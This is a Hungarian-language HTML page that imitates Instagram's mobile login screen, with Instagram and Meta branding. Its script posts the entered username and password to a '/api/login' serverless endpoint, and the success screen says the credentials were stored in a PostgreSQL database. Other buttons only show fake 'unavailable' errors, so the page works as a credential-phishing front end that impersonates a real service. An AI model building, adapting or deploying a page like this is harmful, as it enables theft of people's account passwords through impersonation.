<!DOCTYPE html>
<html lang="hu">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        :root {
            --bg-color: #000000;
            --text-color: #f5f5f5;
            --text-muted: #a8a8a8;
            --border-color: #363636;
            --blue-color: #0095f6;
            --input-bg: #121212;
            --error-color: #ed4956;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-color);
            display: flex;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
        }

        .app-container {
            width: 100%;
            max-width: 400px;
            height: 100%;
            display: flex;
            flex-direction: column;
            padding: 20px;
            position: relative;
        }

        .screen {
            display: none;
            flex-direction: column;
            height: 100%;
        }
        .screen.active {
            display: flex;
        }

        /* Felső sáv */
        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 40px;
            height: 30px;
        }

        .top-bar svg {
            fill: var(--text-color);
            width: 24px;
            height: 24px;
            cursor: pointer;
        }

        .lang-selector {
            display: flex;
            align-items: center;
            color: var(--text-muted);
            font-size: 14px;
            margin: 0 auto;
            margin-right: 40px;
        }
        
        .lang-selector svg {
            width: 12px;
            height: 12px;
            margin-left: 5px;
            fill: var(--text-muted);
        }

        /* Logó */
        .logo-container {
            display: flex;
            justify-content: center;
            margin-bottom: 50px;
        }

        .logo-container svg {
            width: 60px;
            height: 60px;
        }

        /* Beviteli mezők - Floating Label stílus */
        .input-wrapper {
            position: relative;
            margin-bottom: 10px;
            background-color: var(--input-bg);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            transition: border-color 0.2s;
        }

        .input-wrapper:focus-within {
            border-color: var(--text-muted);
        }

        .input-wrapper input {
            width: 100%;
            background: transparent;
            border: none;
            padding: 20px 16px 6px 16px; /* Hely a felcsúszó címkének */
            color: var(--text-color);
            font-size: 14px;
            outline: none;
        }

        .input-wrapper label {
            position: absolute;
            left: 16px;
            top: 16px;
            color: var(--text-muted);
            font-size: 14px;
            pointer-events: none;
            transition: all 0.2s ease-out;
        }

        /* Ha be van kattintva vagy van benne szöveg, felcsúszik a címke */
        .input-wrapper input:focus ~ label,
        .input-wrapper input:not(:placeholder-shown) ~ label {
            top: 6px;
            font-size: 10px;
            color: var(--text-muted);
        }

        /* Jelszó megtekintése gomb */
        .show-password-btn {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: var(--text-color);
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            display: none;
        }

        .input-wrapper input:not(:placeholder-shown) ~ .show-password-btn {
            display: block;
        }

        /* Üzenetek */
        .error-message {
            color: var(--error-color);
            font-size: 13px;
            text-align: center;
            margin-bottom: 10px;
            display: none;
            animation: fadeIn 0.3s ease;
        }
        
        .success-message {
            color: #2ecc71;
            font-size: 13px;
            text-align: center;
            margin-bottom: 10px;
            display: none;
            animation: fadeIn 0.3s ease;
        }

        .error-message.show, .success-message.show {
            display: block;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-5px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Gombok */
        .btn-primary {
            width: 100%;
            background-color: var(--blue-color);
            color: white;
            border: none;
            border-radius: 25px;
            padding: 14px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: opacity 0.2s;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .btn-primary:active {
            opacity: 0.8;
        }

        .btn-primary:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        /* Töltés animáció (Spinner) */
        .spinner {
            display: none;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .link-forgot {
            display: block;
            text-align: center;
            color: var(--text-color);
            text-decoration: none;
            margin-top: 20px;
            font-size: 14px;
            cursor: pointer;
        }

        .link-forgot:hover {
            text-decoration: underline;
        }

        /* Alsó rész */
        .bottom-section {
            margin-top: auto;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-bottom: 20px;
        }

        .btn-outline {
            width: 100%;
            background-color: transparent;
            color: var(--blue-color);
            border: 1px solid var(--blue-color);
            border-radius: 25px;
            padding: 14px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 25px;
        }

        .meta-logo {
            color: var(--text-color);
            font-size: 16px;
            display: flex;
            align-items: center;
            gap: 5px;
            font-weight: 500;
        }
        
        .meta-logo svg {
            width: 20px;
            height: 20px;
            fill: var(--text-color);
        }

        /* Profil / Welcome képernyő */
        .welcome-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100%;
            text-align: center;
        }

        .profile-pic {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            background: linear-gradient(45deg, #f09433, #bc1888);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: white;
            margin-bottom: 20px;
        }

        .btn-logout {
            background: transparent;
            color: var(--error-color);
            border: 1px solid var(--error-color);
            border-radius: 25px;
            padding: 12px 24px;
            font-size: 14px;
            cursor: pointer;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="app-container">
        
        <!-- 1. KÉPERNYŐ: BEJELENTKEZÉS -->
        <div id="screen-login" class="screen active">
            <div class="top-bar">
                <svg viewBox="0 0 24 24" onclick="showError('A visszalépés nem elérhető.')"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"></path></svg>
                <div class="lang-selector" onclick="showError('A nyelvválasztás nem elérhető.')">
                    Magyar
                    <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"></path></svg>
                </div>
            </div>
            
            <div class="logo-container">
                <!-- Instagram logó -->
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <defs>
                        <linearGradient id="ig-gradient" x1="0%" y1="100%" x2="100%" y2="0%">
                            <stop offset="0%" stop-color="#FFDD55" />
                            <stop offset="25%" stop-color="#FF543E" />
                            <stop offset="50%" stop-color="#C837AB" />
                            <stop offset="100%" stop-color="#3E3EF5" />
                        </linearGradient>
                    </defs>
                    <rect x="2" y="2" width="20" height="20" rx="5" ry="5" stroke="url(#ig-gradient)"></rect>
                    <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z" stroke="url(#ig-gradient)"></path>
                    <line x1="17.5" y1="6.5" x2="17.51" y2="6.5" stroke="url(#ig-gradient)"></line>
                </svg>
            </div>

            <!-- Beviteli mezők -->
            <div class="input-wrapper">
                <input type="text" id="username" placeholder=" " autocomplete="username">
                <label for="username">Felhasználónév, e-mail-cím vagy mobilszám</label>
            </div>
            
            <div class="input-wrapper">
                <input type="password" id="password" placeholder=" " autocomplete="current-password">
                <label for="password">Jelszó</label>
                <button class="show-password-btn" id="toggle-password" onclick="togglePassword()">Mutat</button>
            </div>

            <div id="error-message" class="error-message"></div>
            <div id="success-message" class="success-message"></div>

            <button class="btn-primary" id="login-btn" onclick="handleLogin()">
                <span id="btn-text">Bejelentkezés</span>
                <div class="spinner" id="btn-spinner"></div>
            </button>
            
            <a class="link-forgot" onclick="showError('A jelszó-visszaállítás átmenetileg nem működik.')">Elfelejtetted a jelszavadat?</a>

            <div class="bottom-section">
                <button class="btn-outline" onclick="showError('Az új fiók létrehozása átmenetileg nem működik.')">Új fiók létrehozása</button>
                <div class="meta-logo">
                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"></path></svg>
                    Meta
                </div>
            </div>
        </div>

        <!-- 2. KÉPERNYŐ: SIKERES BEJELENTKEZÉS -->
        <div id="screen-welcome" class="screen">
            <div class="welcome-container">
                <div class="profile-pic" id="user-initial">U</div>
                <h2 style="margin-bottom: 10px;">Sikeres belépés!</h2>
                <p style="color: #a8a8a8; margin-bottom: 30px;">Üdv újra, <span id="display-username" style="color: white; font-weight: bold;"></span>!</p>
                <p style="font-size: 12px; color: #666; max-width: 250px; margin-bottom: 30px;">Az adataidat a szerver egy <b>PostgreSQL adatbázisba</b> mentette el.</p>
                <button class="btn-logout" onclick="handleLogout()">Kijelentkezés</button>
            </div>
        </div>

    </div>

    <script>
        // Jelszó megjelenítése/elrejtése
        function togglePassword() {
            const passInput = document.getElementById('password');
            const btn = document.getElementById('toggle-password');
            if (passInput.type === 'password') {
                passInput.type = 'text';
                btn.innerText = 'Elrejtés';
            } else {
                passInput.type = 'password';
                btn.innerText = 'Mutat';
            }
        }

        function showError(msg) {
            const errorDiv = document.getElementById('error-message');
            errorDiv.innerText = msg;
            errorDiv.classList.add('show');
            setTimeout(() => errorDiv.classList.remove('show'), 4000);
        }

        async function handleLogin() {
            const user = document.getElementById('username').value.trim();
            const pass = document.getElementById('password').value.trim();
            const btn = document.getElementById('login-btn');
            const btnText = document.getElementById('btn-text');
            const spinner = document.getElementById('btn-spinner');
            const errorDiv = document.getElementById('error-message');
            const successDiv = document.getElementById('success-message');

            // Reset
            errorDiv.classList.remove('show');
            successDiv.classList.remove('show');

            if (!user || !pass) {
                showError('Kérjük, töltsd ki mindkét mezőt!');
                return;
            }

            // Töltés állapot beállítása
            btn.disabled = true;
            btnText.style.display = 'none';
            spinner.style.display = 'block';

            try {
                // Kérés küldése a Vercel Serverless Functionnek
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username: user, password: pass })
                });

                const data = await response.json();

                if (data.success) {
                    successDiv.innerText = data.message;
                    successDiv.classList.add('show');
                    
                    // Átváltás a sikeres képernyőre
                    setTimeout(() => {
                        document.getElementById('screen-login').classList.remove('active');
                        document.getElementById('screen-welcome').classList.add('active');
                        document.getElementById('display-username').innerText = data.user;
                        document.getElementById('user-initial').innerText = data.user.charAt(0).toUpperCase();
                    }, 1000);
                } else {
                    errorDiv.innerText = data.message;
                    errorDiv.classList.add('show');
                }
            } catch (err) {
                errorDiv.innerText = 'Hálózati hiba. A szerver nem elérhető.';
                errorDiv.classList.add('show');
            } finally {
                // Gomb visszaállítása
                btn.disabled = false;
                btnText.style.display = 'block';
                spinner.style.display = 'none';
            }
        }

        function handleLogout() {
            document.getElementById('username').value = '';
            document.getElementById('password').value = '';
            document.getElementById('screen-welcome').classList.remove('active');
            document.getElementById('screen-login').classList.add('active');
        }
    </script>
</body>
</html>
